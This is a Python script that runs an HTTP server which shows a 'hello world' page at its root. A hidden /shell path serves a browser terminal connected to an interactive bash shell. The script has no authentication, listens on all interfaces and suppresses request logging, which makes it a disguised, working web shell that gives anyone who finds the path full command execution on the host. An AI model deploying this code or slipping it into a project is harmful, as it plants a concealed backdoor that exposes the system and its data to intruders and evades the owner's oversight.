#!/usr/bin/env python3
import os
import pty
import select
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get('PORT') or os.environ.get('SERVER_PORT') or 8080)

master_fd, slave_fd = pty.openpty()
proc = subprocess.Popen(
    ['/bin/bash', '-i'],
    stdin=slave_fd,
    stdout=slave_fd,
    stderr=slave_fd,
    preexec_fn=os.setsid,  # noqa: PLW1509
    env={**os.environ, 'TERM': 'xterm-256color'},
    close_fds=True,
)
os.close(slave_fd)
lock = threading.Lock()


def read_available():
    out = b''
    while True:
        r, _, _ = select.select([master_fd], [], [], 0)
        if not r:
            break
        try:
            chunk = os.read(master_fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    return out


HELLO = b"""<!DOCTYPE html><html><head><meta charset=utf-8><title>hello</title></head>
<body><h1>hello world</h1></body></html>"""

HTML = b"""<!DOCTYPE html><html><head><meta charset=utf-8><title>shell</title>
<link rel=stylesheet href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
<style>html,body{margin:0;height:100%;background:#000}#t{height:100%}</style></head>
<body><div id=t></div>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
<script>
const term = new Terminal({cursorBlink:true, fontSize:14});
const fit = new FitAddon.FitAddon();
term.loadAddon(fit);
term.open(document.getElementById('t'));
fit.fit();
window.addEventListener('resize', () => fit.fit());

term.onData(d => fetch('/shell/input', {method:'POST', body:d}).catch(()=>{}));

async function poll() {
  try {
    const r = await fetch('/shell/output');
    if (r.ok) {
      const b = await r.arrayBuffer();
      if (b.byteLength) term.write(new Uint8Array(b));
    }
  } catch(e) {}
  setTimeout(poll, 40);
}
poll();
</script></body></html>"""


class H(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def log_message(self, *a):
        pass

    def _send(self, body, ctype):
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == '/shell' or self.path == '/shell/':
            self._send(HTML, 'text/html; charset=utf-8')
        elif self.path.startswith('/shell/output'):
            with lock:
                data = read_available()
            self._send(data, 'application/octet-stream')
        else:
            self._send(HELLO, 'text/html; charset=utf-8')

    def do_POST(self):
        if self.path.startswith('/shell/input'):
            n = int(self.headers.get('Content-Length') or 0)
            data = self.rfile.read(n) if n else b''
            with lock:
                try:
                    os.write(master_fd, data)
                except OSError:
                    pass
            self.send_response(200)
            self.send_header('Content-Length', '0')
            self.end_headers()
        else:
            self.send_error(404)


print(f'[*] hello: http://0.0.0.0:{PORT}/')
ThreadingHTTPServer(('0.0.0.0', PORT), H).serve_forever()
